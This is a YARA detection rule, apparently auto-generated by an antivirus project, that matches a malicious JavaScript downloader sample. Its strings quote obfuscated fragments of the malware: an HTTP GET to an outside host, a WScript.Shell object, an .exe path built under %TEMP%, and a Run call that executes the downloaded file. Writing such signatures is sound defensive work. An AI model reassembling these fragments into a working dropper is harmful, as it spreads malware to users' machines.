rule sig_20160329_b2980ec5065013ea4a2d3002d1deff60 {
  meta:
    description = "datamaliciousorder - file 20160329_b2980ec5065013ea4a2d3002d1deff60.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5ada2de4e3f9d862507070800c1e193bae7f69df8751fe68caa3b071e4966c44"

  strings:
    $s1  = "d0[d](\"GET\", \"http://blog.saletron.net/li9soz\", false);" fullword ascii
    $s2  = "for (;;){WScript[k](AS() * 11); if (d0[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s3  = "function z(T, yN){xP = xP * 1; return T - yN;};" fullword ascii
    $s4  = "var v0 = function MB() {return WScript[Bq](\"WScript.Shell\");}(), Z1 = 11;" fullword ascii
    $s5  = "function V() {return v0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"eW4cA8yUD5CCw18.exe\";};" fullword ascii
    $s6  = "function N(){return \"\" + AN;};" fullword ascii
    $s7  = "function zk(Hs){v0[\"Run\"](Hs, xP, xP);};" fullword ascii
    $s8  = "function o() {return ((BD == true) && (BD == Cj)) ? 1 : xP;};" fullword ascii
    $s9  = "function u()" fullword ascii
    $s10 = " while (Z){" fullword ascii
    $s11 = "var cr = new this[\"Date\"]();" fullword ascii
    $s12 = "function AS(){return 22;};" fullword ascii
    $s13 = "return z(dT, lj);" fullword ascii
    $s14 = "function Ul(V0) {var y = (1, 2, 3, 4, 5, V0); return y;};" fullword ascii
    $s15 = "function X(){return Bq;};" fullword ascii
    $s16 = "var q = false;" fullword ascii
    $s17 = "Cj = true; " fullword ascii
    $s18 = "var Cj = false;" fullword ascii
    $s19 = "var BD = false;" fullword ascii
    $s20 = "BD = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}